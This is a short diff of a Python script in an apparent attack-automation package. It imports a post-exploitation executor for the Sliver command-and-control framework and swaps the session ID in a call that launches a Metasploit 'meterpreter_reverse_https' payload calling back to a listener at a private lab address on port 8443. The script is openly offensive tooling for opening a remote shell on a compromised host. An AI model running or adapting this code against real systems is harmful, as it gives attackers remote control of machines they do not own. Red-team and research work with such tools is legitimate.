@@ -50,8 +50,7 @@ async def main():
 
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config = config)
-    # # await sliver_executor.client.connect()
-    await sliver_executor.msf("508994c3-81fe-4ce0-a8b0-fa9561dcca9d", "meterpreter_reverse_https", "192.168.56.39", 8443)
+    await sliver_executor.msf("ef0df1a6-8a75-4343-a202-f4ae61a82c11", "meterpreter_reverse_https", "192.168.56.39", 8443)
 
 
 if __name__ == '__main__':
